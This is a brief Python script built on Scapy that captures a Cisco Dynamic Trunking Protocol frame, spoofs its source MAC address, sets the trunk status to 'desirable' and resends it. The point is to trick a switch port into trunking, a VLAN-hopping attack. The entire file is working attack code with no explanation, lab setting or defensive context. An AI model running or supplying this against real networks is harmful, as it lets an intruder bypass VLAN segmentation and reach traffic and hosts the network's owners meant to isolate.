from scapy.all import *
load_contrib("dtp")

pkt = sniff(filter = "ether dst 01:00:0c:cc:cc:cc", count=1)

pkt[0].src = "00:00:00:11:11:11"
pkt[0][DTP][DTPStatus].status = '\x03'

sendp(pkt[0], loop=0, verbose=1)
